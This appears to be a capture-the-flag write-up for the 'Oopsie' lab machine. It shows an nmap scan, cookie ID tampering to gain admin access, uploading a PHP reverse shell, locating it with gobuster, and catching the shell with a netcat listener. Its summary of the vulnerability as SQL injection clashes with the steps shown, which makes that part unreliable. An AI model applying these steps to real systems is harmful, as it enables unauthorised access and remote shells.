## General Information
- Machine Oopsie
- Difficulty: Very easy
- OS: Linux
- Date: 20/04/2023


## Methodology
- Reconnaissance: Execution of a port scan using Nmap to identify running services on the target machine.
- Exploration: Investigation of a web application and identification of vulnerabilities.
- Results Analysis: Documentation of findings, identification of vulnerabilities, and recommendations for remediation.


## Results
After conducting a Nmap scan, it was found that a web application was running on port 80. The site http://10.129.95.191/ was then explored. During the investigation, the URL http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=2 was inspected, revealing user information for ID 1, which included the access ID, name, and email.  

By inspecting the cookies, it was possible to modify the user ID to the admin ID, granting access to the upload page. A php-reverse-shell.php file was uploaded successfully on this page.  

Using Gobuster, the upload directory was located, and the reverse shell at http://10.129.95.191/uploads/php-reverse-shell.php was executed. This provided access to the server, and further exploitation allowed for privilege escalation up to the root user, utilizing an exploit with root permissions.

### Reconnaissance
- IP: 10.129.95.191
- Port Scan results:

| Port   | State | Service | Version         |
|--------|-------|---------|-----------------|   
| 22/tcp | open  | ssh     | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |
| 80/tcp | open  | http    | Apache httpd 2.4.29 ((Ubuntu)) |

- php execution in web app

### commands and actions performed

#### nmap scan
~~~nmap
└─$ sudo nmap -sVC -v 10.129.95.191 -oA ./nmap 
~~~

#### web app
~~~web app
http://10.129.95.191/

- infomation: 
    Services

    We provide services to operate manufacturing data such as quotes, customer requests etc. Please login to get access to the service.

- inspect:
    http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=2

    id=1 : 
    Access ID	Name	Email
    34322	admin	admin@megacorp.com

    *inspect cookies and change user id to admin id*

    *allowed access to upload page*

    *upload a php-reverse-shell.php in the uploud field found*
~~~

#### Gobuster
~~~Gobuster
gobuster dir -u http://10.129.95.191/ - 40 -w /usr/share/dirb/wordlists/small.txt -x php
~~~

#### php-reverse-shell
~~~ php-reverse-shell
http://10.129.95.191/uploads/php-reverse-shell.php
~~~

#### netcat
~~~ nc
nc -lvnp 1234
~~~


## Exploited Vulnerabilities
- SQL Injection vulnerability in the web application, allowing unauthorized access.
- Privilege escalation using an exploit with root permission.

## Recommendations
- Implement secure coding practices to prevent SQL Injection vulnerabilities, such as parameterized queries or prepared statements.
- Follow the principle of least privilege and ensure that proper access controls are in place to prevent unauthorized privilege escalation.



